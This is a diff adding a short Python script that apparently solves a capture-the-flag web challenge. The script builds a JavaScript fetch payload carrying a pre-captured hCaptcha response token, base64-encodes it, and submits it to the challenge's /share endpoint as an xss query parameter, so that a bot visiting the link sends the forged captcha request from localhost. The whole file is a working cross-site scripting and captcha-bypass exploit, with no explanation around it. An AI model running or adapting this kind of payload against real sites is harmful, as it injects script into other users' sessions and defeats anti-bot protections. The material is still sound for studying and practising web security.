@@ -1,0 +1,22 @@
+import requests, base64
+
+host = "https://web-hcaptcha-azx23mmq.amt.rs"
+# host = "http://127.0.0.1:4071"
+
+response = "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.haJwZACjZXhwzmkZP1qncGFzc2tlecUF0w3quotvfvIje4KbluIbzqdwAacTn7sEtFGTijT80KMQiA2c3lw1hdyQ1Yy2wQFOZHlkiy1XfCy_R4lrp0MSXazqgpKyUZ8O6pbR8U8ExrtJj7uFBx2qvMsU8XW9xpshzdap4dhLebPSg-QDmuZFQ07cZqHEo8NSp-UewHM-OisxwTk3Z0u-Zg15zF7lQDzHwpyoNCi5JKEJ-iKTPD_GrID9G-fh7hWQAGRYfa7A1kvo8JnwYSF-j_7OUgBUva6dFY-CfbAisr6rLSX93hL4WGGBW60BEZ4sLgtxVLgXOBx_xE2zqhDA7Kg8F4X_wwYbmDK0Y0-nZ5OCTqC2R6OUFKWN3XyXMkYibhoB_Q08MMikN-uIEi8a9C52WxCJBxm3IOQ8_2xWwGSoENvnDZglgbbdqr_g3mT3jSJxJZctW8r1ZqHvEPJeoQ7HHG33xr-vakiL4cLCJ2sQHXKYa205l_0AVIXEqzYIDYQcWy-FSh_iDCVqoOoFx4_04mi_JgO8sK9PLCXwbaaaWeYyh72s6MQcklLiZIoPkvW-BaMgxTUNKPcaorrA5d5LSI6kaKsk7BhDcaOy-3h6AQweM-gPf8zpQ9XR7B3QRoHXoXk0ao0R0nNoLN8C6PBXyO755Jf1liHe4VmfXM85NIR866U0GH6u92wKhqLUYlDdraoIxuNHC98O6xfO3LPXFjBlrPhUcdCgaol5S5cbf_xz79pFLuprBvIxxrlfbflBBzqIoWwOs3QpTuMBz_ifvPs-fpdJW4sWfUh7P6QZSPE6Gn91lMITvwl11dbzy3JZRVebDHyOGSSXwd_scNoIHtqVQxr30NTemQdnmwUdVGDQGzC8k8qtPAy8TYf8Iy1j5bkn8eoukwRdjcv7xN83MHw82BHnWxF6aC_LHjwtgnn-LrGuf_UUbCvaR0yM_2RPlWgqz49Z8YxQFrV0c9rGYvw6VIbsxT6jjd1I_K7oEaVELqGOS9PlDhQnFn6RFzp-mhI1Jauk3hKvNcwRAHurezJww1k8CDtEJc4binIFiUwhUvDmBgFVMWPp4p62zTP3gTlNpNakGy0zFDpgMzgh91PB0Z13DDg8zISuUm5ZehMmsyg-2SITrkc7vSjwvuIImoPLXX_eCaJlCmDnTfUSPSZ2ZD1jQNjmDX5TKLlgr1Xh-v6GUq0i27ZLhARaQthBifjpBHDueXjAXExR8ZXuX5DPyVkOy8HzorTK7kkGu6wTGbS3V3hYg4N7ntTKixgku1ctyA4iq7f08K1Wn8SMyKLZuHWp6mdQhOuDqCQMZL9qsGb0goWVUvjRSHRr5MbbUP9Hen9WCzP7eg34Uu9xwTJn1_756zi16xywOfcSu9QFj67dkXF5WUE1DYJVtFANu3lew988qmIjDHZKPrd1-C5gBaLG-H1phYCsTij-sntEDvqkZSE0BIZCBCED3kXBewmF3mja8jY_bfGgbrVmlWeO1YWu9yr9DWOE-urSxnQl0hXJl1FnwBUayWDgD0rNQXgXYyBiBa6FtwPaCmO8z396sVatoIGndKIRYBuizjl67caYjOCvp-DUxbhOF1sI6lL2_i6KRQdvYlpiy3pLhvSLv10-8Br7twuwlU1KZn6OmrK7XiCQIt-rv7UMPN5vV32gXI50stPP6MsiEHutWaSUH55vZAY_zltAIZBYf3tw04vw-DWE9JEjrPw6gosbbpEQopwLBztKV_rJ_oyrmYLHLHMCM9KunDGZa9Gx1t4SZBRXc8TqZVWOlA3rE1kM4TbUUAOnqjp7czJWkbDl521I-S2pmPstLCZZV_uQmOQj_GGnDh5Lphdri9KHa6Kql9CyiPOG1YI3qmdi5XOG7kAv7zZMUOmmBIE4D1v5bBwci4Loy3GIb7K6fSw_7slA-TyT17ewXHaMRnCdfy1BMyGbSbaOZnBrW1i2J21DUzoxbtiOlXMW31grpmzK7kkThGB2Eljupm1WiriQgG_Xv5nWo68sWSTt8KJrcqg0NTg1ZGE5M6hzaGFyZF9pZM4NO2Qp.ql8qM6Z_plvVqMZDwagcrm58y8J72-vjyTaO4nMaQog"
+
+payload = """
+fetch('http://127.0.0.1:4071/',{
+  "headers": {
+    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+  },
+  "body": "h-captcha-response={response}",
+  "method": "POST",
+});
+"""
+payload = payload.replace("{response}", response)
+b64_payload = base64.b64encode(payload.encode()).decode()
+
+# post to /share with url=http://127.0.0.1:4071/?xss={payload}
+r = requests.post(f"{host}/share", data={"url": f"http://127.0.0.1:4071/?xss={b64_payload}"})  
+print(r.text)
